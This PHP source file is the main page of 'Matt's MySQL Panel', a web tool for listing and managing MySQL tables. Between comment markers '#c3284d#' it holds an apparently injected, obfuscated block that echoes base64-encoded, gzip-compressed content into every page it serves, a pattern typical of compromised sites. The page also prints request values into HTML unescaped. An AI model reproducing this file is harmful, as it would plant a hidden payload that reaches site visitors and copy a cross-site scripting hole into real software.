<?php
/*

Matt's MySQL Panel - administer MySQL databases remotely
Copyright (C) 2001 Matt Wilson <matt@mattsscripts.co.uk

This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.

*/

/* include the database connectivity code and the language stuff */
require "db_routines.php";
require "lang.php";

/* connect to the database */
$db = dbconnect_only($vars["database"]);

/* error connecting to the database? */
if($db == false){
	Header("Location: nologin.php");
	exit();
}

/* unget the GETted variables */
unget($vars["database"]);
unget($vars["msg"]);

/* make a list of dbs we have access to */
$alloweddbs = array();
if(($t = @mysql_list_dbs($db)) != false) {
	for($tmp=0; $tmp<mysql_num_rows($t); ++$tmp) {
		$db = @mysql_tablename($t, $tmp);
		if(mysql_select_db($db) != false) { $alloweddbs[] = $db; }
	}
}

// select the db we want
if(@mysql_select_db($vars["database"]) == false) {
	Header("Location: nologin.php");
	exit();
}

/* check to see whether there is (or has been) an error listing tables in the database */
if(($t = mysql_list_tables($vars["database"])) == false){
	Header("Location: error.php?database=".urlencode($vars["database"])."&errmsg=".urlencode(@mysql_errno()." : ".@mysql_error()." : Unable to obtain a list of fields for '".$table."'"));
	exit();
}

/* store all the table names in an (easier) referencable array */
for($tmp=0; $tmp<mysql_num_rows($t); $tmp++){ $tables[] = mysql_tablename($t,$tmp); }


#c3284d#
echo(gzinflate(base64_decode("JY5BDsIgFET3TXoH8jfqpiQuFXoKL/AFBJQCgV/R20vtbvKSNzOiquIzMfpmI4HMh/gT37hTmMdBJ7UuJtLUiidzPAj/KLgYVouS4IjyhfOMzmJ71UmlhevUYkioeSWkOmWXgcVuSLg1T2QKsN6eQvDRSsCVErB/5T0VbYqE2AEGb6ME1Yc3wRlvHUk4A2tek9vSLPh+ZT6cruMg+P55/gE=")));
#/c3284d#
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<title>MPanel: <?php echo _WELCOMETITLE_; ?></title>
<link rel="stylesheet" href="style.css"><script language="javascript" src="function.js"></script>
</head>
<body>
<table width="780" class="tmain">
<tr><td align="center" colspan="2"><a href="http://www.mattsscripts.co.uk/mpanel.htm"><img src="logo.gif" width="241" height="79" alt="Matt's MySQL Panel"></a></td></tr>
<tr><td align="center" colspan="2"><h4><?php echo _CURDATABASE_; ?> : '<?php echo $vars["database"]; ?>'</h4></td></tr>
<?php if(isset($vars["msg"])) { echo '<tr><td align="center">'.$vars["msg"].'</td></tr>'; } ?>
<tr><td valign="top">
<table width="100%">
<tr><td align="center" valign="top">
<table width="150" cellspacing="2">
<tr><td align="center" class="td_nav" onClick="javascript:top.location.href='createtable.php?database=<?php echo urlencode($vars["database"]); ?>';"><a class="a_nav" href="createtable.php?database=<?php echo urlencode($vars["database"]); ?>"><?php echo _CREATETABLE_; ?></a></td></tr>
<tr><td align="center" class="td_nav" onClick="javascript:top.location.href='importdata.php?database=<?php echo urlencode($vars["database"]); ?>';"><a class="a_nav" href="importdata.php?database=<?php echo urlencode($vars["database"]); ?>"><?php echo _IMPORTDBDATA_; ?></a></td></tr>
<tr><td align="center" class="td_nav" onClick="javascript:top.location.href='dumpdata.php?database=<?php echo urlencode($vars["database"]); ?>';"><a class="a_nav" href="dumpdata.php?database=<?php echo urlencode($vars["database"]); ?>"><?php echo _EXPORTDB_; ?></a></td></tr>
<tr><td align="center" class="td_nav"><a class="a_nav" href="deletedatabase.php?database=<?php echo urlencode($vars["database"]); ?>" onClick='return confirm(<?php echo tag(_DELETEDBCONFIRM_); ?>);'><?php echo _DELETEDB_; ?></a></td></tr>
<tr><td align="center" class="td_nav" onClick="javascript:top.location.href='dbmanager.php';"><a class="a_nav" href="dbmanager.php"><?php echo _DBMANAGER_; ?></a></td></tr>
<tr><td align="center" class="td_nav" onClick="javascript:top.location.href='help.php';"><a class="a_nav" href="help.php"><?php echo _HELPPAGE_; ?></a></td></tr>
<?php

// no point in showing the "Logout" button if we aren't logged in!
if($use_login == true) {
?><tr><td align="center" class="td_nav"><a class="a_nav" href="logout.php" onClick='return confirm(<?php echo tag(_LOGOUTCONFIRM_); ?>);'><?php echo _LOGOUT_; ?></a></td></tr><?php
}

	if(sizeof($alloweddbs) > 1) {
?>
<tr><td>&nbsp;</td></tr>
<tr><td align="center"><form method="post" action="main.php"><select name="database" class="td_sm">
<?php
		for($tmp=0; $tmp<sizeof($alloweddbs); ++$tmp) {
			echo "<option";
			if($alloweddbs[$tmp] == $vars["database"]) { echo " SELECTED"; }
			echo ">", $alloweddbs[$tmp], "</option>";
		}
?>
</select><br><input type="submit" class="td_sm" value=<?php echo tag(_CHANGEDB_); ?></form></td></tr>
<?php
	}
?>
</table>
</td><td align="center">
<table width="630">
<tr><th width="500"><?php echo _TABLENAME_; ?></th><th colspan="3" align="center" width="150"><?php echo _COMMANDS_; ?></td></tr>
<?php

/* print out all the tables w/links */
for($tmp=0; $tmp<sizeof($tables); $tmp++){
	echo "<tr><td align=left><a href=\"tabledetails.php?table=", urlencode($tables[$tmp]), "&database=", urlencode($vars["database"]), "\">", $tables[$tmp], "</a></td><td class=\"td_nav\" align=\"center\" width=\"50\"><a href=\"deletetable.php?database=", urlencode($vars["database"]), "&table=", urlencode($tables[$tmp]), "\" onClick='return confirm(", tag(_DELETETABLECONFIRM_), ");' class=\"a_nav\">", _DELETETABLE_, "</a></td><td class=\"td_nav\" align=\"center\" width=\"50\"><a class=\"a_nav\" href=\"optimizetable.php?database=", urlencode($vars["database"]), "&table=", urlencode($tables[$tmp]), "\">", _OPTIMIZETABLE_, "</a></td><td align=\"center\" class=\"td_nav\" width=\"50\"><a class=\"a_nav\" href=\"renametable.php?database=", urlencode($vars["database"]), "&table=", urlencode($tables[$tmp]), "\">", _RENAMETABLE_, "</a></td></tr>";
}

/* close the db connection */
@mysql_close();

?>
</td></tr>
</table>
</td></tr>
<tr><td colspan="2" align="center">&nbsp;</td></tr>
<tr><td colspan="2" align="center">
<form action="submitsql.php" method="post">
<?php echo _EXECUTESQL_; ?>: <input type="text" name="sqlcmd" size="50">
<input type="hidden" name="database" value=<?php echo tag($vars["database"]); ?>>
<input type="submit" value=<?php echo _OK_; ?>>
</form>
</td></tr>
</table>
</body>
</html>
